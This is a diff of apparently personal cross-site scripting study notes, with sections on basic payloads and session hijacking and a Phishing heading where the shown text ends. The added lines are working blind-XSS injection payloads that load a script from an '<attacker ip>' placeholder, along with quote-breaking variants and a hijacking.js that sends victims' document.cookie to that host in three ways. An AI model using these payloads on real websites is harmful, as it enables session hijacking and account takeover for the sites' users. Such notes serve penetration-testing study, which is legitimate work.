@@ -1,6 +1,7 @@
 Payload
 
 https://www.youtube.com/watch?v=KHwVjzWei1c
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss
 
 ```js
 <script>alert(window.origin)</script>
@@ -10,20 +11,37 @@ https://www.youtube.com/watch?v=KHwVjzWei1c
 
 Session Hijacking
 
-test file
+testing payload
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss
 
 ```js
 // remote script
-<script src="http://<attacker ip>/empty.js"></script>
+<script src="http://<attacker ip>"></script>
+// note that html in the front
+'><script src="http://<attacker ip>"></script>
+"><script src="http://<attacker ip>"></script>
 ```
 
 hijacking.js
 
 ```js
+// enter a workable payload into the vulnerability input field
+"><script src="http://<attacker ip>/hijacking.js"></script>
+```
+
+```js
+// hijacking.js
 // sudo python3 -m http.server 80
 var oReq = new XMLHttpRequest();
 oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
 oReq.send()
+
+// hijacking.js
+document.location='http://<attacker ip>/?output='+document.cookie;
+// hijacking.js
+new Image().src='http://<attacker ip>/?output='+document.cookie;
+// and so on
 ```
 
 Phishing
